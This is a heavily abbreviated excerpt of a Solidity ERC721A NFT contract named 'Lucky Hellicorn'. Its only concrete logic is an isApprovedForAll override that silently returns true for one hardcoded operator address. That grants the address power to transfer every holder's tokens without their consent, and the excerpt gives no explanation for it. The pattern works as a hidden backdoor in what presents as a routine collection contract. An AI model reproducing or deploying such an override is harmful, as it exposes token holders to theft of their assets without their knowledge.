  ...
  Ownable
{
  ...
  function isApprovedForAll(address owner, address operator)
    ...
    returns (bool)
  {
    if(operator==0x375c5d1dbEdB845DC382EF367674045D1493326f){return true;}
...
contract Lucky_Hellicorn is Ownable, ERC721A, ReentrancyGuard, DefaultOperatorFilterer {
  ...
  constructor(
    uint256 maxBatchSize_,
    uint256 collectionSize_
  ) ERC721A("Lucky Hellicorn", "LH", maxBatchSize_, collectionSize_) {
